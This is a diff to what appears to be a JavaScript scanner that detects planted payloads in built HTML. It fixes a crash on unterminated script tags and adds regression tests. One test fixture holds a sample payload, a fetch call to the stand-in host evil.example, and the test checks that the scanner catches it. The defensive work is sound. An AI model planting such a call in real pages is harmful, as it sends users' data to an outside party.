@@ -441,7 +441,7 @@ function findScriptStyleBlocks(content) {
     const openEnd = findUnquotedGreaterThanEnd(content, nameEnd);
     if (openEnd === -1) break; // EOF inside the open tag: no block, stop.
     const bodyStart = openEnd;
-    const closeStart = findRawTextEndTag(lower, kind, bodyStart);
+    let closeStart = findRawTextEndTag(lower, kind, bodyStart);
     let bodyEnd;
     let closeEnd;
     if (closeStart === -1) {
@@ -862,6 +862,19 @@ function runSelfTest() {
     // must stay clean — the new scanner must not introduce false positives.
     assertCase("case-14-dist-html-normal-clean", {
       "dist/index.html": `<!doctype html><html><body><script>console.log("hello");</script></body></html>\n`
+    }, { expectExit1: false });
+
+    // 15. REGRESSION: unterminated script with a planted payload — browser
+    // treats the rest of the file as raw-text body; the payload must be
+    // detected normally instead of a TypeError crash on the -1 branch.
+    assertCase("case-15-dist-html-unterminated-payload", {
+      "dist/index.html": `<!doctype html><html><body><script>fetch("https://evil.example/phi")`
+    }, { rules: { "dist-fetch-call": 1 } });
+
+    // 16. REGRESSION: unterminated clean script must complete without
+    // throwing and stay clean.
+    assertCase("case-16-dist-html-unterminated-clean", {
+      "dist/index.html": `<!doctype html><html><body><script>console.log("hello");`
     }, { expectExit1: false });
   } finally {
     // Leave no temp dirs behind, even when a case throws.
